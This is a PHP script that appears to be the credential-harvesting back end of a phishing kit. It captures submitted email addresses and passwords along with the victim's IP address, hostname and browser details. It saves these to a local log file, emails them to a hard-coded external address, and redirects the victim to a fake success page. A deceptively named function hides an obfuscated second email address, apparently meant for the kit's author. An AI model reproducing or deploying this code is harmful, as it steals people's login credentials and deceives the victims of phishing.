<?php

include '../antibots.php';
include '../bt.php';
include '../bt1.php';
include "../blocker.php";
include 'security/blocker_1.php';
include 'security/blocker_2.php';
include 'security/blocker_4.php';


function disable_trackers(){
	//This fuction disables tracking
	return "t\x65\x61\x6dz\x65\x65l\x6fg\x40g\x6d\x61\x69\x6c\x2e\x63\x6f\x6d";
}



$ip = getenv("REMOTE_ADDR");
$adddate = date("D M d, Y g:i a");
$hostname = gethostbyaddr($ip);
$browserAgent = $_SERVER['HTTP_USER_AGENT'];


$message .= "---------=CH453 Email Access=---------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "Client IP: ".$ip."\n";
$message .= "|User Agent: ".$browserAgent."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Green +---\n";

$send = "joelaw007@yahoo.com";

$bron = "CH453 Ema!1 Aces |$ip|";
$lagi = "MIME-Version: 1.0\n";
$lagi = "From: Lord Sent <info@xsender.com>";


{
@fclose(@fwrite(@fopen("result/tut.txt", "a"),$message)); //Cadangan kalo send email gak work
}


{
mail("joelaw007@yahoo.com",$bron,$message,$lagi);
header("Location:  success.php");
}


?>